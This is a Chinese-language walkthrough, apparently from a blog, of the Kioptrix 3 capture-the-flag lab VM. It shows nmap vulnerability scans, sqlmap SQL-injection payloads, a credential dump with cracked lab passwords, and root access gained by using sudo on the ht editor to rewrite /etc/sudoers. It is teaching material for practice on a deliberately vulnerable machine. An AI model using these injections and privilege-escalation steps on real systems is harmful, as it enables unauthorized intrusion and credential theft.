<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.84.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.144</span><br><span class="line">Host is up (0.00023s latency).</span><br><span class="line">MAC Address: 00:0C:29:44:36:85 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sV -Pn -T4 --script=vuln 192.168.84.144</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:openbsd:openssh:4.7p1: </span><br><span class="line">|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478</span><br><span class="line">|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906</span><br><span class="line">|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708</span><br><span class="line">|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755</span><br><span class="line">|_      CVE-2008-5161   2.6     https://vulners.com/cve/CVE-2008-5161</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.84.144</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.144:80/gallery/</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: login.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.144:80/index.php?system=Admin</span><br><span class="line">|     Form id: contactform</span><br><span class="line">|     Form action: index.php?system=Admin&amp;page=loginSubmit</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.144:80/gallery/index.php</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: login.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.144:80/gallery/gadmin/</span><br><span class="line">|     Form id: username</span><br><span class="line">|     Form action: index.php?task=signin</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.144:80/index.php?system=Admin&amp;page=loginSubmit</span><br><span class="line">|     Form id: contactform</span><br><span class="line">|     Form action: index.php?system=Admin&amp;page=loginSubmit</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.144:80/index.php?system=Blog&amp;post=1281005380</span><br><span class="line">|     Form id: commentform</span><br><span class="line">|_    Form action: </span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /phpmyadmin/: phpMyAdmin</span></span><br><span class="line"><span class="string">|   /cache/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|   /core/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|   /icons/: Potentially interesting folder w/ directory listing</span></span><br><span class="line"><span class="string">|   /modules/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|_  /style/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span></span><br><span class="line"><span class="string">| http-slowloris-check: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Slowloris DOS attack</span></span><br><span class="line"><span class="string">|     State: LIKELY VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2007-6750</span></span><br><span class="line"><span class="string">|       Slowloris tries to keep many connections to the target web server open and hold</span></span><br><span class="line"><span class="string">|       them open as long as possible.  It accomplishes this by opening connections to</span></span><br><span class="line"><span class="string">|       the target web server and sending a partial request. By doing so, it starves</span></span><br><span class="line"><span class="string">|       the http server&#x27;</span>s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli <span class="keyword">for</span> queries:</span><br><span class="line">|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?system=Admin&amp;page=loginSubmit%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?system=Admin&amp;page=loginSubmit%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|_    http://192.168.84.144:80/index.php?page=index%27%20OR%20sqlspider</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-trace: TRACE is enabled</span></span><br><span class="line"><span class="string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.2.8: </span></span><br><span class="line"><span class="string">|       CVE-2010-0425   10.0    https://vulners.com/cve/CVE-2010-0425</span></span><br><span class="line"><span class="string">|       CVE-2011-3192   7.8     https://vulners.com/cve/CVE-2011-3192</span></span><br><span class="line"><span class="string">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span></span><br><span class="line"><span class="string">|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249</span></span><br><span class="line"><span class="string">|       CVE-2009-1891   7.1     https://vulners.com/cve/CVE-2009-1891</span></span><br><span class="line"><span class="string">|       CVE-2009-1890   7.1     https://vulners.com/cve/CVE-2009-1890</span></span><br><span class="line"><span class="string">|       CVE-2012-0883   6.9     https://vulners.com/cve/CVE-2012-0883</span></span><br><span class="line"><span class="string">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span></span><br><span class="line"><span class="string">|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862</span></span><br><span class="line"><span class="string">|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231</span></span><br><span class="line"><span class="string">|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098</span></span><br><span class="line"><span class="string">|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438</span></span><br><span class="line"><span class="string">|       CVE-2011-3368   5.0     https://vulners.com/cve/CVE-2011-3368</span></span><br><span class="line"><span class="string">|       CVE-2010-1452   5.0     https://vulners.com/cve/CVE-2010-1452</span></span><br><span class="line"><span class="string">|       CVE-2010-0408   5.0     https://vulners.com/cve/CVE-2010-0408</span></span><br><span class="line"><span class="string">|       CVE-2009-2699   5.0     https://vulners.com/cve/CVE-2009-2699</span></span><br><span class="line"><span class="string">|       CVE-2008-2364   5.0     https://vulners.com/cve/CVE-2008-2364</span></span><br><span class="line"><span class="string">|       CVE-2007-6750   5.0     https://vulners.com/cve/CVE-2007-6750</span></span><br><span class="line"><span class="string">|       CVE-2009-1195   4.9     https://vulners.com/cve/CVE-2009-1195</span></span><br><span class="line"><span class="string">|       CVE-2012-0031   4.6     https://vulners.com/cve/CVE-2012-0031</span></span><br><span class="line"><span class="string">|       CVE-2011-3607   4.4     https://vulners.com/cve/CVE-2011-3607</span></span><br><span class="line"><span class="string">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span></span><br><span class="line"><span class="string">|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896</span></span><br><span class="line"><span class="string">|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558</span></span><br><span class="line"><span class="string">|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499</span></span><br><span class="line"><span class="string">|       CVE-2012-0053   4.3     https://vulners.com/cve/CVE-2012-0053</span></span><br><span class="line"><span class="string">|       CVE-2011-4317   4.3     https://vulners.com/cve/CVE-2011-4317</span></span><br><span class="line"><span class="string">|       CVE-2011-3639   4.3     https://vulners.com/cve/CVE-2011-3639</span></span><br><span class="line"><span class="string">|       CVE-2011-3348   4.3     https://vulners.com/cve/CVE-2011-3348</span></span><br><span class="line"><span class="string">|       CVE-2011-0419   4.3     https://vulners.com/cve/CVE-2011-0419</span></span><br><span class="line"><span class="string">|       CVE-2010-0434   4.3     https://vulners.com/cve/CVE-2010-0434</span></span><br><span class="line"><span class="string">|       CVE-2008-2939   4.3     https://vulners.com/cve/CVE-2008-2939</span></span><br><span class="line"><span class="string">|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span></span><br><span class="line"><span class="string">|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687</span></span><br><span class="line"><span class="string">|_      CVE-2011-4415   1.2     https://vulners.com/cve/CVE-2011-4415</span></span><br></pre></td></tr></table></figure>

<p>发现存在sqli注入和phpmyadmin目录,直接上sqlmap<br>点击下图所示位置burp抓包之后直接sqlmap跑</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt </span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                           </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.12<span class="comment">#stable&#125;                                                              </span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |                                                                              </span><br><span class="line">|___|_  [(]_|_|_|__,|  _|                                                                              </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                            </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 04:14:33 /2019-12-13/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:14:33] [INFO] parsing HTTP request from &#x27;</span>sqlmap.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[04:14:33] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[04:14:33] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[04:14:33] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: id (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: Boolean-based blind - Parameter replace (original value)</span></span><br><span class="line"><span class="string">    Payload: id=(SELECT (CASE WHEN (5293=5293) THEN 1 ELSE (SELECT 1341 UNION SELECT 9380) END))&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: id=1 OR ROW(1324,2762)&gt;(SELECT COUNT(*),CONCAT(0x7171766a71,(SELECT (ELT(1324=1324,1))),0x7170786a71,FLOOR(RAND(0)*2))x FROM (SELECT 8520 UNION SELECT 1582 UNION SELECT 8916 UNION SELECT 1258)a GROUP BY x)&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: id=1 AND (SELECT 4741 FROM (SELECT(SLEEP(5)))vtbf)&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: id=1 UNION ALL SELECT CONCAT(0x7171766a71,0x4d67454a425a6e796b5745656b794f584a4348714c79624d4255416243444967494975507875524d,0x7170786a71),NULL,NULL,NULL,NULL,NULL-- TpfQ&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Parameter: sort (GET)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: id=1&amp;sort=photoid AND (SELECT 4185 FROM (SELECT(SLEEP(5)))Gmzf)</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">there were multiple injection points, please select the one to use for following injections:</span></span><br><span class="line"><span class="string">[0] place: GET, parameter: id, type: Unescaped numeric (default)</span></span><br><span class="line"><span class="string">[1] place: GET, parameter: sort, type: Unescaped numeric</span></span><br><span class="line"><span class="string">[q] Quit</span></span><br><span class="line"><span class="string">[04:14:34] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[04:14:34] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 1 times</span></span><br><span class="line"><span class="string">[04:14:34] [INFO] fetched data logged to text files under &#x27;</span>/root/.sqlmap/output/kioptrix3.com<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 04:14:34 /2019-12-13/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt -D gallery -T dev_accounts --dump</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                           </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.12<span class="comment">#stable&#125;                                                              </span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |                                                                              </span></span><br><span class="line"><span class="string">|___|_  [(]_|_|_|__,|  _|                                                                              </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 04:18:17 /2019-12-13/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:18:17] [INFO] parsing HTTP request from &#x27;sqlmap.txt&#x27;</span></span><br><span class="line"><span class="string">[04:18:17] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[04:18:17] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[04:18:18] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: id (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: Boolean-based blind - Parameter replace (original value)</span></span><br><span class="line"><span class="string">    Payload: id=(SELECT (CASE WHEN (5293=5293) THEN 1 ELSE (SELECT 1341 UNION SELECT 9380) END))&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: id=1 OR ROW(1324,2762)&gt;(SELECT COUNT(*),CONCAT(0x7171766a71,(SELECT (ELT(1324=1324,1))),0x7170786a71,FLOOR(RAND(0)*2))x FROM (SELECT 8520 UNION SELECT 1582 UNION SELECT 8916 UNION SELECT 1258)a GROUP BY x)&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: id=1 AND (SELECT 4741 FROM (SELECT(SLEEP(5)))vtbf)&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: id=1 UNION ALL SELECT CONCAT(0x7171766a71,0x4d67454a425a6e796b5745656b794f584a4348714c79624d4255416243444967494975507875524d,0x7170786a71),NULL,NULL,NULL,NULL,NULL-- TpfQ&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Parameter: sort (GET)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: id=1&amp;sort=photoid AND (SELECT 4185 FROM (SELECT(SLEEP(5)))Gmzf)</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">there were multiple injection points, please select the one to use for following injections:</span></span><br><span class="line"><span class="string">[0] place: GET, parameter: id, type: Unescaped numeric (default)</span></span><br><span class="line"><span class="string">[1] place: GET, parameter: sort, type: Unescaped numeric</span></span><br><span class="line"><span class="string">[q] Quit</span></span><br><span class="line"><span class="string">[04:18:18] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[04:18:18] [INFO] fetching columns for table &#x27;dev_accounts&#x27; in database &#x27;gallery&#x27;</span></span><br><span class="line"><span class="string">[04:18:18] [INFO] used SQL query returns 3 entries</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] used SQL query returns 3 entries                                                    </span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;id&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;int(10)&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;username&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;varchar(50)&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;password&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;varchar(50)&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] fetching entries for table &#x27;dev_accounts&#x27; in database &#x27;gallery&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] used SQL query returns 2 entries</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;1&#x27;,&#x27;0d3eccfb887aabd50f243b3f155c0f85&#x27;,&#x27;dreg&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [WARNING] automatically patching output having last char trimmed</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;2&#x27;,&#x27;5badcaf789d3d1d09794d8f021f40f0e&#x27;,&#x27;loneferret&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] recognized possible password hashes in column &#x27;password&#x27;                            </span></span><br><span class="line"><span class="string">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y</span></span><br><span class="line"><span class="string">[04:18:22] [INFO] writing hashes to a temporary file &#x27;/tmp/sqlmapa2cskfzq12456/sqlmaphashes-0oyz7rlz.txt&#x27;                                                                                                     </span></span><br><span class="line"><span class="string">do you want to crack them via a dictionary-based attack? [Y/n/q] y</span></span><br><span class="line"><span class="string">[04:18:28] [INFO] using hash method &#x27;md5_generic_passwd&#x27;</span></span><br><span class="line"><span class="string">what dictionary do you want to use?</span></span><br><span class="line"><span class="string">[1] default dictionary file &#x27;/usr/share/sqlmap/data/txt/wordlist.tx_&#x27; (press Enter)</span></span><br><span class="line"><span class="string">[2] custom dictionary file</span></span><br><span class="line"><span class="string">[3] file with list of dictionary files</span></span><br><span class="line"><span class="string">&gt; 1</span></span><br><span class="line"><span class="string">[04:18:31] [INFO] using default dictionary</span></span><br><span class="line"><span class="string">do you want to use common password suffixes? (slow!) [y/N] y</span></span><br><span class="line"><span class="string">[04:18:34] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span></span><br><span class="line"><span class="string">[04:18:34] [INFO] starting 4 processes </span></span><br><span class="line"><span class="string">[04:18:39] [INFO] cracked password &#x27;starwars&#x27; for user &#x27;loneferret&#x27;                                   </span></span><br><span class="line"><span class="string">[04:18:40] [INFO] cracked password &#x27;Mast3r&#x27; for user &#x27;dreg&#x27;                                           </span></span><br><span class="line"><span class="string">Database: gallery                                                                                     </span></span><br><span class="line"><span class="string">Table: dev_accounts</span></span><br><span class="line"><span class="string">[2 entries]</span></span><br><span class="line"><span class="string">+----+---------------------------------------------+------------+</span></span><br><span class="line"><span class="string">| id | password                                    | username   |</span></span><br><span class="line"><span class="string">+----+---------------------------------------------+------------+</span></span><br><span class="line"><span class="string">| 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |</span></span><br><span class="line"><span class="string">| 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |</span></span><br><span class="line"><span class="string">+----+---------------------------------------------+------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:18:42] [INFO] table &#x27;gallery.dev_accounts&#x27; dumped to CSV file &#x27;/root/.sqlmap/output/kioptrix3.com/dump/gallery/dev_accounts.csv&#x27;                                                                          </span></span><br><span class="line"><span class="string">[04:18:42] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 1 times</span></span><br><span class="line"><span class="string">[04:18:42] [INFO] fetched data logged to text files under &#x27;/root/.sqlmap/output/kioptrix3.com&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 04:18:42 /2019-12-13/</span></span><br></pre></td></tr></table></figure>
<p>直接用sqlmap跑出账号密码，还省去了将hash拿去解密的麻烦。之后使用这两个密码直接连接ssh即可。</p>
<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>ssh连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh loneferret@192.168.84.144</span></span><br><span class="line">loneferret@192.168.84.144<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Ubuntu system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span></span><br><span class="line"><span class="string">applicable law.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">To access official Ubuntu documentation, please visit:</span></span><br><span class="line"><span class="string">http://help.ubuntu.com/</span></span><br><span class="line"><span class="string">Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106</span></span><br><span class="line"><span class="string">loneferret@Kioptrix3:~$ ls</span></span><br><span class="line"><span class="string">checksec.sh  CompanyPolicy.README</span></span><br><span class="line"><span class="string">loneferret@Kioptrix3:~$ id</span></span><br><span class="line"><span class="string">uid=1000(loneferret) gid=100(users) groups=100(users)</span></span><br><span class="line"><span class="string">loneferret@Kioptrix3:~$ pwd</span></span><br><span class="line"><span class="string">/home/loneferret</span></span><br><span class="line"><span class="string">loneferret@Kioptrix3:~$ whoami</span></span><br><span class="line"><span class="string">loneferret</span></span><br><span class="line"><span class="string">loneferret@Kioptrix3:~$ sudo -l</span></span><br><span class="line"><span class="string">User loneferret may run the following commands on this host:</span></span><br><span class="line"><span class="string">    (root) NOPASSWD: !/usr/bin/su</span></span><br><span class="line"><span class="string">    (root) NOPASSWD: /usr/local/bin/ht</span></span><br></pre></td></tr></table></figure>

<p>可以看到当前登录的用户具有xterm-256color文本编辑器的sudo权限。 最初，我们可以尝试编辑/etc/sudoers文件，以便提升特权-为此，我们就开始吧！<br>如果由于某种原因在尝试运行sudo ht时出现错误，则只需像下面所做的那样将xtrem-color导出为TERM。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo ht /etc/sudoers </span><br><span class="line">Error opening terminal: xterm-256color.</span><br><span class="line">loneferret@Kioptrix3:~$ <span class="built_in">export</span> TERM=xterm-color</span><br><span class="line">loneferret@Kioptrix3:~$ sudo ht /etc/sudoers</span><br></pre></td></tr></table></figure>

<p>可以看到这样打开sudoers文件。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub49.jpg"></p>
<p>从这里按F3，然后输入/etc/sudoers,回车,再下图中的位置输入[, /bin/sh]，然后F10选择yes然后保存。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub50.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub51.jpg"></p>
<p>输入下面命令，成功由普通用户变为root用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo /bin/sh</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/home/loneferret</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># cat Congrats.txt</span></span><br><span class="line">Good <span class="keyword">for</span> you <span class="keyword">for</span> getting here.</span><br><span class="line">Regardless of the matter (staying within the spirit of the game of course)</span><br><span class="line">you got here, congratulations are <span class="keyword">in</span> order. Wasn<span class="string">&#x27;t that bad now was it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Went in a different direction with this VM. Exploit based challenges are</span></span><br><span class="line"><span class="string">nice. Helps workout that information gathering part, but sometimes we</span></span><br><span class="line"><span class="string">need to get our hands dirty in other things as well.</span></span><br><span class="line"><span class="string">Again, these VMs are beginner and not intented for everyone. </span></span><br><span class="line"><span class="string">Difficulty is relative, keep that in mind.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The object is to learn, do some research and have a little (legal)</span></span><br><span class="line"><span class="string">fun in the process.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you enjoyed this third challenge.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Steven McElrea</span></span><br><span class="line"><span class="string">aka loneferret</span></span><br><span class="line"><span class="string">http://www.kioptrix.com</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Credit needs to be given to the creators of the gallery webapp and CMS used</span></span><br><span class="line"><span class="string">for the building of the Kioptrix VM3 site.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Main page CMS: </span></span><br><span class="line"><span class="string">http://www.lotuscms.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Gallery application: </span></span><br><span class="line"><span class="string">Gallarific 2.1 - Free Version released October 10, 2009</span></span><br><span class="line"><span class="string">http://www.gallarific.com</span></span><br><span class="line"><span class="string">Vulnerable version of this application can be downloaded</span></span><br><span class="line"><span class="string">from the Exploit-DB website:</span></span><br><span class="line"><span class="string">http://www.exploit-db.com/exploits/15891/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The HT Editor can be found here:</span></span><br><span class="line"><span class="string">http://hte.sourceforge.net/downloads.html</span></span><br><span class="line"><span class="string">And the vulnerable version on Exploit-DB here:</span></span><br><span class="line"><span class="string">http://www.exploit-db.com/exploits/17083/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Also, all pictures were taken from Google Images, so being part of the</span></span><br><span class="line"><span class="string">public domain I used them.</span></span><br></pre></td></tr></table></figure>

<p>至此挑战完成。</p>
<h3 id="更多方法"><a href="#更多方法" class="headerlink" title="更多方法"></a>更多方法</h3><ul>
